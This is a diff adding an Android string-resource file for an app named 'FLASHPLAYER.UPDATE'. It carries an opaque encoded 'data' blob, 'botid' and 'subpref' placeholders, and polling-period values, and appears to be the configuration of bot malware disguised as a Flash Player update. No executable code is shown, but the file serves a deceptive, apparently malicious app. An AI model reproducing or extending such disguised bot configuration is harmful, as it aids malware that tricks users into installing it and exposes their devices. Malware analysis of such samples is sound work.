@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">FLASHPLAYER.UPDATE</string>
+    <string name="title_activity_main">APPNAME</string>
+    <string name="html">file:///android_asset/html/index.html</string>
+    <string name="data">mYbprPQCTjqqKPplOit0tCoWN6idvkRrNZsWYElyA0RQchxU3PhePYYB6XQNjnkiNcqi/Cg87jtBfnZY6+3vNyW1FcYOH9Yxt/khnNTPXqUh8yp9zwUcFILfE16BBVCYELFOV3mxExbycEUtGlJmcSDPN/bCcmcfmQBDLgx3rrGoiIsigAcsbuATiV6/7fkweaA+sM1Z1J1JL+6d2IQ4YRXTRpwBWE8N1k5yBob7zCEOXOE4AyYfLCAxBn16rJAu</string>
+    <string name="time">300</string>
+    <string name="subpref">SUBPREFV</string>
+    <string name="botid">BOTIDV</string>
+    <string name="startPeriod">60</string>
+</resources>
